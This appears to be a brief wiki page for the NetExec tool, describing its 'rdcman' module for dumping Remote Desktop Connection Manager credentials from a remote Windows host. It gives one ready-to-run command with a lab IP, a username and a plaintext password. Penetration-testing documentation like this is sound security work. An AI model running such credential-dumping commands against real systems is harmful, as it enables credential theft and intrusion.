title: Dump Remote Desktop Credential Manager
html:
description: Dump Remote Desktop Connection Manager credentials

🆕 Dump Remote Desktop Connection Manager

{% hint style="warning" %} You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

nxc smb 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! -M rdcman
